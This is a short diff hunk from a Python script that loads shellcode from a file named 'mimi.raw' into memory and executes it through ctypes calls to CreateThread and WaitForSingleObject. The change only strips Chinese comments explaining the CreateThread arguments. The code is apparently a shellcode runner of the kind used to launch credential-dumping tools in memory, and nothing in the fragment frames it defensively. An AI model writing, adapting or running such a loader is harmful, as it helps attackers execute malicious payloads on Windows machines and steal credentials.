@@ -16,12 +16,12 @@ with open("mimi.raw","rb") as file:
         ctypes.c_int(len(shellcode))
     )
     ht  = ctypes.windll.kernel32.CreateThread(
-        ctypes.c_int(0),#指向安全属性的指针
-        ctypes.c_int(0),#初始堆栈大小
-        ctypes.c_int(ptr),#指向起始地址的指针
-        ctypes.c_int(0),#指向任何参数的指针
-        ctypes.c_int(0),#创建标志
-        ctypes.pointer(ctypes.c_int(0)))#指向接收线程标识符的值的指针
+        ctypes.c_int(0),
+        ctypes.c_int(0),
+        ctypes.c_int(ptr),
+        ctypes.c_int(0),
+        ctypes.c_int(0),
+        ctypes.pointer(ctypes.c_int(0)))
     ctypes.windll.kernel32.WaitForSingleObject(
         ctypes.c_int(ht ),
         ctypes.c_int(-1)
